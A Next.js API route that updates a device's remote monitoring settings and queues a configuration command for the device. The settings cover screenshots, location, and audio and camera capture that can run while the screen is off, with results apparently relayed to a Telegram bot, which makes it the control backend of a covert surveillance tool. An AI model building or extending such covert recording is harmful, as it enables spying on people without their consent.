import { NextRequest, NextResponse } from 'next/server';
import { connectToDatabase } from '@/lib/mongodb';
import { Device } from '@/models/Device';
import { Command } from '@/models/Command';
import { getAuthUser } from '@/lib/auth';

export async function PATCH(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const auth = getAuthUser(req);
    if (!auth || auth.type !== 'user') {
      return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
    }

    const { id } = await params;
    const body = await req.json();

    await connectToDatabase();
    const device = await Device.findOne({ _id: id, userId: auth.userId });
    if (!device) {
      return NextResponse.json({ error: 'Device not found' }, { status: 404 });
    }

    // Basic metadata
    if (body.deviceName) device.deviceName = body.deviceName;
    if (body.lockMessage) {
      device.lockMessage = body.lockMessage;
      device.settings.lockMessage = body.lockMessage;
    }

    // Settings
    if (typeof body.syncIntervalSeconds === 'number') {
      device.settings.syncIntervalSeconds = Math.max(5, body.syncIntervalSeconds);
      device.settings.syncIntervalMinutes = Math.ceil(device.settings.syncIntervalSeconds / 60);
    } else if (typeof body.syncIntervalMinutes === 'number') {
      device.settings.syncIntervalMinutes = body.syncIntervalMinutes;
      device.settings.syncIntervalSeconds = Math.max(5, body.syncIntervalMinutes * 60);
    }
    if (typeof body.telegramBotToken === 'string') {
      device.settings.telegramBotToken = body.telegramBotToken.trim();
    }
    if (typeof body.telegramChatId === 'string') {
      device.settings.telegramChatId = body.telegramChatId.trim();
    }
    if (typeof body.isMonitoringActive === 'boolean') {
      device.settings.isMonitoringActive = body.isMonitoringActive;
    }
    if (typeof body.sendScreenshot === 'boolean') {
      device.settings.sendScreenshot = body.sendScreenshot;
    }
    if (typeof body.screenshotInterval === 'number') {
      device.settings.screenshotInterval = Math.max(5, body.screenshotInterval);
    }
    if (typeof body.sendLocation === 'boolean') {
      device.settings.sendLocation = body.sendLocation;
    }
    if (typeof body.locationInterval === 'number') {
      device.settings.locationInterval = Math.max(1, body.locationInterval);
    }
    if (typeof body.sendAudio === 'boolean') {
      device.settings.sendAudio = body.sendAudio;
    }
    if (typeof body.audioDuration === 'number') {
      device.settings.audioDuration = Math.max(5, body.audioDuration);
    }
    if (typeof body.audioScreenOff === 'boolean') {
      device.settings.audioScreenOff = body.audioScreenOff;
    }
    if (typeof body.sendCamera === 'boolean') {
      device.settings.sendCamera = body.sendCamera;
    }
    if (typeof body.cameraInterval === 'number') {
      device.settings.cameraInterval = Math.max(5, body.cameraInterval);
    }
    if (typeof body.cameraScreenOff === 'boolean') {
      device.settings.cameraScreenOff = body.cameraScreenOff;
    }
    if (body.cameraFacing === 'front' || body.cameraFacing === 'back') {
      device.settings.cameraFacing = body.cameraFacing;
    }

    await device.save();

    // Queue UPDATE_CONFIG command for next device sync
    await Command.create({
      deviceId: device._id,
      userId: auth.userId,
      type: 'UPDATE_CONFIG',
      params: device.settings,
      status: 'PENDING',
    });

    return NextResponse.json({
      message: 'Remote settings updated successfully',
      device,
    });
  } catch (error: any) {
    console.error('Update settings error:', error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
